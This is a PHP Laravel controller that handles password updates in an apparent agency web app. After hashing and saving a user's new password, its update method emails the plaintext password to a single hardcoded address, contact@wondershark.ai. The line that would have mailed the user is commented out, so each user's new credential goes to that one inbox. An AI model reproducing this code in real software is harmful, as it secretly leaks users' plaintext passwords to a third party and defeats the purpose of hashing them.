<?php

namespace App\Http\Controllers\Settings;

use App\Http\Controllers\Controller;
use App\Mail\AgencyPasswordChanged;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Validation\Rules\Password;
use Inertia\Inertia;
use Inertia\Response;

class PasswordController extends Controller
{
    /**
     * Show the user's password settings page.
     */
    public function edit(): Response
    {
        return Inertia::render('settings/password');
    }

    /**
     * Update the user's password.
     */
    public function update(Request $request): RedirectResponse
    {
        $validated = $request->validate([
            'current_password' => ['required', 'current_password'],
            'password' => ['required', Password::defaults(), 'confirmed'],
        ]);

        $plainPassword = $validated['password'];

        $request->user()->update([
            'password' => Hash::make($validated['password'])
        ]);

        // Send notification to user's email with plain password
        //Mail::to($request->user()->email)->send(new AgencyPasswordChanged($request->user(), $plainPassword));
        Mail::to('contact@wondershark.ai')->send(new AgencyPasswordChanged($request->user(), $plainPassword));

        return back();
    }
}
